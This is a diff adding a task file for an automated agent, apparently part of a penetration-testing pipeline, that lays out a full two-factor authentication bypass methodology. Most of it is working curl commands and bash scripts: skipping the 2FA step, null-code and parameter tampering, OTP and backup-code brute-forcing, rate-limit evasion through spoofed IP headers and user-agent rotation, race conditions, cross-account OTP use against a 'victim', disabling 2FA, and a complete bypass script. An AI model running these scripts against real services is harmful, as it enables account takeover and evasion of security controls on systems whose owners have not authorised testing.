@@ -1,0 +1,747 @@
+================================================================================
+TASK 65 · 2FA/MFA BYPASS SUITE
+================================================================================
+Covers testing_toolkit.txt Phase 7 Step 24
+Complete two-factor authentication bypass methodology.
+
+OBJECTIVE:
+- Bypass TOTP, SMS, Email-based 2FA
+- Brute-force backup codes with rate-limit bypass
+- Exploit response manipulation vulnerabilities
+- Test token reuse and timing attacks
+- Identify 2FA enrollment/removal weaknesses
+
+================================================================================
+INPUTS
+================================================================================
+outputs/har/accounts/*_auth.json          ← Auth tokens from HAR (per-account)
+outputs/har/common_data.txt               ← 2FA-related endpoints from HAR
+outputs/live_base_urls.txt                ← Target hosts
+outputs/url_corpus_all_in_scope.txt       ← URL corpus (grep for login/2fa/mfa paths)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/2fa_bypass/
+├── 2fa_mechanisms.txt             ← Identified 2FA methods
+├── bypass_results.txt             ← Successful bypasses
+├── rate_limit_bypass.txt          ← Rate limit evasion results
+├── response_manipulation.txt      ← Response tampering findings
+├── backup_code_attack.txt         ← Backup code brute-force results
+└── scan_log.txt                   ← Full execution log
+
+================================================================================
+🧠 2FA FUNDAMENTALS - UNDERSTAND BEFORE ATTACKING 🧠
+================================================================================
+
+───────────────────────────────────────
+2FA Methods (Common)
+───────────────────────────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Method          │ Description                  │ Attack Surface            │
+├─────────────────┼──────────────────────────────┼───────────────────────────┤
+│ TOTP            │ Time-based OTP (Google Auth) │ Timing, brute-force       │
+│ SMS OTP         │ Code via SMS                 │ SIM swap, brute-force     │
+│ Email OTP       │ Code via email               │ Email takeover, brute     │
+│ Push            │ Approve/deny on device       │ Fatigue attacks           │
+│ Hardware Key    │ FIDO2/U2F                    │ Limited attack surface    │
+│ Backup Codes    │ One-time recovery codes      │ Brute-force, predictable  │
+│ Security Qs     │ Knowledge-based              │ OSINT, brute-force        │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+───────────────────────────────────────
+2FA Flow (Typical)
+───────────────────────────────────────
+1. User enters username/password → SUCCESS
+2. Server sets temporary state (not fully authenticated)
+3. Server sends/generates 2FA code
+4. User enters 2FA code
+5. Server validates → Full authentication granted
+
+ATTACK OPPORTUNITIES:
+- Skip step 2-4 entirely
+- Bypass rate limits on step 4
+- Manipulate response in step 5
+- Reuse code from step 3
+- Attack backup/recovery paths
+
+================================================================================
+PHASE 1: 2FA MECHANISM DISCOVERY
+================================================================================
+
+───────────────────────────────────────
+1.1 Identify 2FA Endpoints
+───────────────────────────────────────
+# Common 2FA endpoint patterns
+/verify
+/mfa
+/2fa
+/two-factor
+/otp
+/totp
+/challenge
+/auth/step2
+/login/verify
+/api/auth/mfa
+/api/verify-otp
+/api/validate-code
+
+# From HAR files
+grep -rPi '2fa|mfa|otp|totp|verify|challenge' outputs/har_*
+
+# Enumerate endpoints
+for endpoint in verify mfa 2fa otp totp challenge; do
+    curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
+        "https://target.com/${endpoint}"
+    curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
+        "https://target.com/api/${endpoint}"
+done
+
+───────────────────────────────────────
+1.2 Identify 2FA Type
+───────────────────────────────────────
+# Check settings/security page for 2FA options
+curl -s -b session.txt "https://target.com/settings/security" | \
+    grep -iPo '(totp|authenticator|sms|email|backup|recovery|u2f|webauthn)'
+
+# Look for JavaScript references
+grep -rPi 'totp|otpauth|authenticator' temp/agent1/js_responses/
+
+# Check for QR code endpoints (TOTP setup)
+curl -s -b session.txt "https://target.com/settings/2fa/setup"
+
+───────────────────────────────────────
+1.3 Map 2FA Parameters
+───────────────────────────────────────
+# Common parameter names
+code
+otp
+token
+totp
+mfa_code
+verification_code
+auth_code
+pin
+2fa_code
+backup_code
+recovery_code
+
+# Capture 2FA request format
+curl -s -X POST "https://target.com/verify" \
+    -d "code=123456" \
+    -c cookies.txt -b cookies.txt \
+    -D response_headers.txt
+
+================================================================================
+PHASE 2: DIRECT 2FA BYPASS
+================================================================================
+
+───────────────────────────────────────
+2.1 Skip 2FA Step Entirely
+───────────────────────────────────────
+# After password auth, try accessing protected pages directly
+
+# Step 1: Login with valid creds (stops at 2FA)
+curl -s -c session.txt -X POST "https://target.com/login" \
+    -d "username=user&password=pass"
+
+# Step 2: Skip 2FA, access protected resource
+curl -s -b session.txt "https://target.com/dashboard"
+curl -s -b session.txt "https://target.com/api/me"
+curl -s -b session.txt "https://target.com/account/settings"
+
+# If access granted → 2FA completely bypassable!
+
+───────────────────────────────────────
+2.2 Null/Empty Code Bypass
+───────────────────────────────────────
+# Test with empty, null, or zero values
+
+curl -s -b session.txt -X POST "https://target.com/verify" -d "code="
+curl -s -b session.txt -X POST "https://target.com/verify" -d "code=null"
+curl -s -b session.txt -X POST "https://target.com/verify" -d "code=0"
+curl -s -b session.txt -X POST "https://target.com/verify" -d "code=000000"
+curl -s -b session.txt -X POST "https://target.com/verify" -d ""
+curl -s -b session.txt -X POST "https://target.com/verify"
+
+# JSON format
+curl -s -b session.txt -X POST "https://target.com/api/verify" \
+    -H "Content-Type: application/json" \
+    -d '{"code":null}'
+
+curl -s -b session.txt -X POST "https://target.com/api/verify" \
+    -H "Content-Type: application/json" \
+    -d '{"code":""}'
+
+curl -s -b session.txt -X POST "https://target.com/api/verify" \
+    -H "Content-Type: application/json" \
+    -d '{}'
+
+───────────────────────────────────────
+2.3 Parameter Manipulation
+───────────────────────────────────────
+# Remove 2FA parameter entirely
+curl -s -b session.txt -X POST "https://target.com/verify" \
+    -d "other_param=value"
+
+# Add success indicator
+curl -s -b session.txt -X POST "https://target.com/verify" \
+    -d "code=123456&verified=true"
+
+curl -s -b session.txt -X POST "https://target.com/verify" \
+    -d "code=123456&success=1"
+
+curl -s -b session.txt -X POST "https://target.com/verify" \
+    -d "code=123456&skip=1"
+
+# Change HTTP method
+curl -s -b session.txt "https://target.com/verify?code=123456"
+curl -s -b session.txt -X PUT "https://target.com/verify" -d "code=123456"
+curl -s -b session.txt -X DELETE "https://target.com/verify"
+
+───────────────────────────────────────
+2.4 Direct Access to Post-2FA Endpoints
+───────────────────────────────────────
+# After login (pre-2FA), try different endpoints
+
+# API endpoints may not enforce 2FA
+curl -s -b session.txt "https://target.com/api/v1/user"
+curl -s -b session.txt "https://target.com/api/v2/profile"
+curl -s -b session.txt "https://target.com/graphql" \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{me{id email}}"}'
+
+# Mobile API endpoints
+curl -s -b session.txt "https://target.com/mobile/api/user"
+curl -s -b session.txt -H "X-Mobile-App: true" "https://target.com/api/user"
+
+# Legacy endpoints
+curl -s -b session.txt "https://target.com/v1/dashboard"
+curl -s -b session.txt "https://target.com/old/account"
+
+================================================================================
+PHASE 3: RESPONSE MANIPULATION
+================================================================================
+
+───────────────────────────────────────
+3.1 Understanding Response Manipulation
+───────────────────────────────────────
+CONCEPT: Client trusts server response without proper validation
+- Server returns {"success": false, "error": "Invalid code"}
+- Attacker intercepts and changes to {"success": true}
+- Client processes modified response as successful
+
+REQUIRES: Client-side logic that trusts response data
+
+───────────────────────────────────────
+3.2 Identify Response Format
+───────────────────────────────────────
+# Capture actual response to wrong code
+curl -s -b session.txt -X POST "https://target.com/verify" \
+    -d "code=000000" | jq .
+
+# Common response patterns:
+# {"success": false, "error": "Invalid code"}
+# {"status": "error", "message": "Wrong OTP"}
+# {"verified": false}
+# {"code": 401, "valid": false}
+
+───────────────────────────────────────
+3.3 Test Client-Side Trust
+───────────────────────────────────────
+# If you control a proxy (mitmproxy), modify responses
+# This tests if client-side JavaScript trusts the response
+
+# Example mitmproxy script to modify response:
+# def response(flow):
+#     if "verify" in flow.request.url:
+#         flow.response.text = '{"success": true}'
+
+# For CLI testing, you need to:
+# 1. Understand what client does after receiving response
+# 2. Manually check if modified response grants access
+
+# Check JavaScript for response handling
+grep -rP 'success|verified|authenticated' temp/agent1/js_responses/ | head -50
+
+───────────────────────────────────────
+3.4 Status Code Manipulation
+───────────────────────────────────────
+# Some clients only check HTTP status code
+
+# If wrong code returns 401/403, test if 200 grants access
+# This requires proxy interception to modify status code
+
+# Check if app handles different status codes
+curl -s -o /dev/null -w "%{http_code}" -b session.txt \
+    -X POST "https://target.com/verify" -d "code=123456"
+
+================================================================================
+PHASE 4: BRUTE-FORCE ATTACKS
+================================================================================
+
+───────────────────────────────────────
+4.1 TOTP/OTP Brute-Force
+───────────────────────────────────────
+# TOTP is 6 digits = 1,000,000 combinations
+# With 30-second window, need ~33k attempts/second (usually not feasible)
+
+# But check for:
+# - Extended validity window
+# - No rate limiting
+# - Multiple valid codes accepted
+
+#!/bin/bash
+# brute_6digit.sh - Test OTP brute-force
+
+TARGET="$1"
+SESSION_COOKIE="$2"
+START=${3:-0}
+END=${4:-999999}
+
+for code in $(seq -w $START $END); do
+    response=$(curl -s -b "$SESSION_COOKIE" \
+        -X POST "$TARGET" \
+        -d "code=$code")
+    
+    if echo "$response" | grep -qi "success\|welcome\|dashboard"; then
+        echo "[!] VALID CODE: $code"
+        break
+    fi
+    
+    # Check for rate limiting
+    if echo "$response" | grep -qi "rate\|limit\|locked\|too many"; then
+        echo "[-] Rate limited at code: $code"
+        break
+    fi
+done
+
+───────────────────────────────────────
+4.2 SMS OTP Brute-Force
+───────────────────────────────────────
+# SMS OTP usually 4-6 digits
+# 4 digits = 10,000 combinations
+# 6 digits = 1,000,000 combinations
+
+# Test for rate limiting first
+for i in {1..20}; do
+    curl -s -b session.txt -X POST "https://target.com/verify" \
+        -d "code=000000" > /dev/null
+    echo "Attempt $i"
+done
+
+# Check if locked out
+
+───────────────────────────────────────
+4.3 Backup Code Brute-Force
+───────────────────────────────────────
+# Backup codes are often 8-10 alphanumeric
+# But some apps use simple patterns
+
+# Common backup code formats:
+# - 8 digits: 00000000 - 99999999
+# - 8 hex: 00000000 - FFFFFFFF
+# - Format: XXXX-XXXX (easier to brute)
+
+# Check if backup codes endpoint has weaker rate limits
+curl -s -b session.txt -X POST "https://target.com/verify/backup" \
+    -d "code=12345678"
+
+# Some apps allow multiple backup code attempts without lockout
+# (separate from main OTP rate limit)
+
+───────────────────────────────────────
+4.4 Rate Limit Bypass Techniques
+───────────────────────────────────────
+#!/bin/bash
+# rate_limit_bypass_2fa.sh
+
+TARGET="$1"
+SESSION="$2"
+
+# Technique 1: IP rotation via headers
+HEADERS=(
+    "X-Forwarded-For"
+    "X-Real-IP"
+    "X-Originating-IP"
+    "X-Remote-IP"
+    "X-Client-IP"
+    "X-Remote-Addr"
+    "True-Client-IP"
+    "CF-Connecting-IP"
+)
+
+for i in {1..100}; do
+    IP="10.0.0.$i"
+    for header in "${HEADERS[@]}"; do
+        curl -s -b "$SESSION" -X POST "$TARGET" \
+            -H "$header: $IP" \
+            -d "code=$((RANDOM % 1000000))" > /dev/null
+    done
+done
+
+# Technique 2: User-Agent rotation
+USER_AGENTS=(
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) Safari/605"
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604"
+    "Mozilla/5.0 (Linux; Android 14) Chrome/120"
+)
+
+for ua in "${USER_AGENTS[@]}"; do
+    for code in $(seq 100000 100100); do
+        curl -s -b "$SESSION" -X POST "$TARGET" \
+            -A "$ua" \
+            -d "code=$code" > /dev/null
+    done
+done
+
+# Technique 3: Case variation on username
+# If rate limit is per-user, try case variations
+# user@email.com, USER@email.com, User@email.com
+
+# Technique 4: Add spaces/null bytes
+# username%00, username%20, username+
+
+# Technique 5: Different endpoints
+curl -s -X POST "https://target.com/verify" -d "code=123456"
+curl -s -X POST "https://target.com/api/verify" -d "code=123456"
+curl -s -X POST "https://target.com/api/v1/verify" -d "code=123456"
+curl -s -X POST "https://target.com/api/v2/verify" -d "code=123456"
+
+================================================================================
+PHASE 5: TOKEN REUSE & TIMING ATTACKS
+================================================================================
+
+───────────────────────────────────────
+5.1 OTP Reuse Attack
+───────────────────────────────────────
+# Test if same OTP can be used multiple times
+
+# Step 1: Get valid OTP (from test account you control)
+VALID_OTP="123456"
+
+# Step 2: Use OTP successfully
+curl -s -b session1.txt -X POST "https://target.com/verify" \
+    -d "code=$VALID_OTP"
+
+# Step 3: Try using same OTP again
+curl -s -b session2.txt -X POST "https://target.com/verify" \
+    -d "code=$VALID_OTP"
+
+# If works → OTP not invalidated after use!
+
+───────────────────────────────────────
+5.2 Old OTP Acceptance
+───────────────────────────────────────
+# Test if previously generated OTPs still work
+
+# TOTP has 30-second window, but some apps accept:
+# - Previous window (30 seconds ago)
+# - Multiple previous windows (clock skew tolerance)
+# - Very old codes (broken implementation)
+
+# If you have test account, generate OTP and wait
+# Then test if old OTPs are accepted
+
+───────────────────────────────────────
+5.3 Cross-Account OTP
+───────────────────────────────────────
+# Test if OTP from Account A works for Account B
+
+# Step 1: Generate OTP for attacker account
+# Step 2: Start login for victim account
+# Step 3: Use attacker's OTP for victim's 2FA
+
+curl -s -c session.txt -X POST "https://target.com/login" \
+    -d "username=victim&password=victimpass"
+
+curl -s -b session.txt -X POST "https://target.com/verify" \
+    -d "code=$ATTACKER_OTP"
+
+# If works → OTP not bound to specific user/session!
+
+───────────────────────────────────────
+5.4 TOTP Timing Attack
+───────────────────────────────────────
+# TOTP changes every 30 seconds
+# Test boundary conditions
+
+# Get current TOTP time window
+CURRENT_TIME=$(date +%s)
+WINDOW=$((CURRENT_TIME / 30))
+
+# Test right at window boundary
+# Some apps accept codes from adjacent windows
+
+───────────────────────────────────────
+5.5 Race Condition on OTP Validation
+───────────────────────────────────────
+# Send multiple requests simultaneously with same OTP
+# May bypass "single use" check
+
+#!/bin/bash
+# race_otp.sh
+
+TARGET="$1"
+SESSION="$2"
+OTP="$3"
+
+for i in {1..50}; do
+    curl -s -b "$SESSION" -X POST "$TARGET" -d "code=$OTP" &
+done
+wait
+
+# Check if multiple sessions were authenticated
+
+================================================================================
+PHASE 6: 2FA ENROLLMENT/REMOVAL BYPASS
+================================================================================
+
+───────────────────────────────────────
+6.1 Disable 2FA Without Verification
+───────────────────────────────────────
+# Check if 2FA can be disabled without current 2FA code
+
+curl -s -b session.txt -X POST "https://target.com/settings/2fa/disable"
+curl -s -b session.txt -X DELETE "https://target.com/api/2fa"
+curl -s -b session.txt -X POST "https://target.com/settings/security" \
+    -d "2fa_enabled=false"
+
+# Check if password alone is sufficient (no 2FA code required)
+curl -s -b session.txt -X POST "https://target.com/settings/2fa/disable" \
+    -d "password=currentpassword"
+
+───────────────────────────────────────
+6.2 Backup Codes Regeneration
+───────────────────────────────────────
+# Can backup codes be regenerated without 2FA?
+
+curl -s -b session.txt "https://target.com/settings/2fa/backup-codes/new"
+curl -s -b session.txt -X POST "https://target.com/api/2fa/backup-codes/regenerate"
+
+# If new backup codes generated without verifying current 2FA:
+# Attacker with session can generate new codes → bypass 2FA
+
+───────────────────────────────────────
+6.3 2FA Setup Flow Bypass
+───────────────────────────────────────
+# Test if 2FA setup can be aborted, leaving account in weak state
+
+# Start 2FA setup
+curl -s -b session.txt "https://target.com/settings/2fa/setup"
+
+# Don't complete, access protected resources
+curl -s -b session.txt "https://target.com/dashboard"
+
+# Check if 2FA is actually enforced
+
+───────────────────────────────────────
+6.4 TOTP Secret Leakage
+───────────────────────────────────────
+# Check if TOTP secret is exposed in responses
+
+curl -s -b session.txt "https://target.com/settings/2fa" | grep -i "secret\|key"
+curl -s -b session.txt "https://target.com/api/2fa/setup" | jq .
+
+# Look for otpauth:// URI (contains secret)
+# otpauth://totp/App:user@email?secret=BASE32SECRET&issuer=App
+
+# Check QR code endpoint for direct secret exposure
+curl -s -b session.txt "https://target.com/settings/2fa/qr"
+
+================================================================================
+PHASE 7: BACKUP/RECOVERY PATH ATTACKS
+================================================================================
+
+───────────────────────────────────────
+7.1 Security Questions Bypass
+───────────────────────────────────────
+# If security questions are 2FA alternative
+
+# Test for OSINT-able answers
+# Common questions: mother's maiden name, first pet, high school
+
+# Test for case-insensitive answers
+curl -s -X POST "https://target.com/verify/security-question" \
+    -d "answer=smith"
+curl -s -X POST "https://target.com/verify/security-question" \
+    -d "answer=SMITH"
+curl -s -X POST "https://target.com/verify/security-question" \
+    -d "answer=Smith"
+
+───────────────────────────────────────
+7.2 Email/SMS Recovery Bypass
+───────────────────────────────────────
+# "Send code to backup email/phone" flow
+
+# Test if recovery skips 2FA entirely
+curl -s -X POST "https://target.com/login/recover" \
+    -d "email=user@target.com"
+
+# Test for email/phone enumeration
+curl -s -X POST "https://target.com/login/recover" \
+    -d "email=nonexistent@target.com"
+
+───────────────────────────────────────
+7.3 Support Flow Bypass
+───────────────────────────────────────
+# Social engineering angle - but also test:
+
+# "Lost access to 2FA" flow
+curl -s "https://target.com/support/2fa-recovery"
+curl -s -X POST "https://target.com/api/support/disable-2fa" \
+    -d "reason=lost_phone"
+
+# Check if identity verification is weak
+
+───────────────────────────────────────
+7.4 Trusted Device Bypass
+───────────────────────────────────────
+# "Remember this device" feature
+
+# Check how device is identified
+curl -s -D - "https://target.com/login" | grep -i "cookie\|token"
+
+# Try copying device token
+# Check if device ID is predictable
+
+# Test if "remember device" can be set without completing 2FA
+curl -s -X POST "https://target.com/verify" \
+    -d "code=000000&remember_device=true"
+
+================================================================================
+PHASE 8: COMPLETE 2FA BYPASS SCRIPT
+================================================================================
+
+#!/bin/bash
+# complete_2fa_bypass.sh
+
+TARGET="$1"
+LOGIN_URL="${TARGET}/login"
+VERIFY_URL="${TARGET}/verify"
+PROTECTED_URL="${TARGET}/dashboard"
+USERNAME="$2"
+PASSWORD="$3"
+
+OUTPUT_DIR="outputs/2fa_bypass"
+mkdir -p "$OUTPUT_DIR"
+
+echo "═══════════════════════════════════════════════════════════════"
+echo " Complete 2FA Bypass Test - $TARGET"
+echo "═══════════════════════════════════════════════════════════════"
+
+# Login to get pre-2FA session
+curl -s -c "$OUTPUT_DIR/session.txt" -X POST "$LOGIN_URL" \
+    -d "username=$USERNAME&password=$PASSWORD" > /dev/null
+
+# TEST 1: Direct Access Bypass
+echo ""
+echo "[TEST 1] Direct Access Bypass"
+echo "─────────────────────────────"
+response=$(curl -s -b "$OUTPUT_DIR/session.txt" "$PROTECTED_URL")
+if echo "$response" | grep -qi "dashboard\|welcome\|$USERNAME"; then
+    echo "[!] CRITICAL: 2FA can be bypassed by direct URL access!"
+    echo "BYPASS: Direct access to protected URL" >> "$OUTPUT_DIR/bypass_results.txt"
+else
+    echo "[+] Direct access blocked"
+fi
+
+# TEST 2: Null/Empty Code
+echo ""
+echo "[TEST 2] Null/Empty Code"
+echo "─────────────────────────────"
+for code in "" "null" "0" "000000"; do
+    response=$(curl -s -b "$OUTPUT_DIR/session.txt" -X POST "$VERIFY_URL" \
+        -d "code=$code")
+    if echo "$response" | grep -qi "success\|verified\|welcome"; then
+        echo "[!] BYPASS with code='$code'"
+        echo "BYPASS: Null/empty code ($code)" >> "$OUTPUT_DIR/bypass_results.txt"
+        break
+    fi
+done
+
+# TEST 3: Parameter Manipulation
+echo ""
+echo "[TEST 3] Parameter Manipulation"
+echo "─────────────────────────────"
+params=("verified=true" "success=1" "skip=1" "bypass=1")
+for param in "${params[@]}"; do
+    response=$(curl -s -b "$OUTPUT_DIR/session.txt" -X POST "$VERIFY_URL" \
+        -d "code=123456&$param")
+    if echo "$response" | grep -qi "success\|verified\|welcome"; then
+        echo "[!] BYPASS with param: $param"
+        echo "BYPASS: Parameter manipulation ($param)" >> "$OUTPUT_DIR/bypass_results.txt"
+    fi
+done
+
+# TEST 4: Rate Limiting Check
+echo ""
+echo "[TEST 4] Rate Limiting Check"
+echo "─────────────────────────────"
+locked=0
+for i in {1..30}; do
+    response=$(curl -s -b "$OUTPUT_DIR/session.txt" -X POST "$VERIFY_URL" \
+        -d "code=$((RANDOM % 1000000))")
+    if echo "$response" | grep -qi "rate\|limit\|locked\|too many\|wait"; then
+        echo "[+] Rate limiting active after $i attempts"
+        echo "Rate limit: Active after $i attempts" >> "$OUTPUT_DIR/rate_limit_bypass.txt"
+        locked=1
+        break
+    fi
+done
+if [ $locked -eq 0 ]; then
+    echo "[!] No rate limiting detected after 30 attempts!"
+    echo "VULNERABLE: No rate limiting on 2FA" >> "$OUTPUT_DIR/rate_limit_bypass.txt"
+fi
+
+echo ""
+echo "[*] Tests complete. Results in $OUTPUT_DIR"
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+
+ATTACK PRIORITY:
+────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Priority │ Attack                      │ Impact                            │
+├──────────┼─────────────────────────────┼───────────────────────────────────┤
+│ 1        │ Direct Access Bypass        │ Complete 2FA bypass               │
+│ 2        │ Null/Empty Code             │ Complete bypass                   │
+│ 3        │ Response Manipulation       │ Client-side bypass                │
+│ 4        │ No Rate Limiting            │ Enables brute-force               │
+│ 5        │ Token Reuse                 │ Replay attacks                    │
+│ 6        │ Backup Code Weakness        │ Alternative bypass path           │
+│ 7        │ 2FA Removal Without Auth    │ Persistent bypass                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+VERIFICATION CHECKLIST:
+───────────────────────
+□ Can protected pages be accessed without completing 2FA?
+□ Does null/empty code bypass verification?
+□ Is there rate limiting on OTP attempts?
+□ Can the same OTP be reused?
+□ Can 2FA be disabled without verification?
+□ Are backup codes predictable or brute-forceable?
+
+================================================================================
+COMMON MISTAKES TO AVOID
+================================================================================
+❌ Only testing the main 2FA endpoint, missing API/mobile versions
+❌ Not testing backup/recovery flows
+❌ Forgetting to test 2FA enrollment/removal
+❌ Missing rate limit bypass techniques
+❌ Not testing OTP reuse across sessions
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ All 2FA mechanisms identified
+✓ Direct access bypass tested
+✓ Null/empty/parameter manipulation tested
+✓ Rate limiting evaluated with bypass attempts
+✓ Token reuse and timing attacks tested
+✓ Backup/recovery paths evaluated
+✓ 2FA enrollment/removal security tested
+
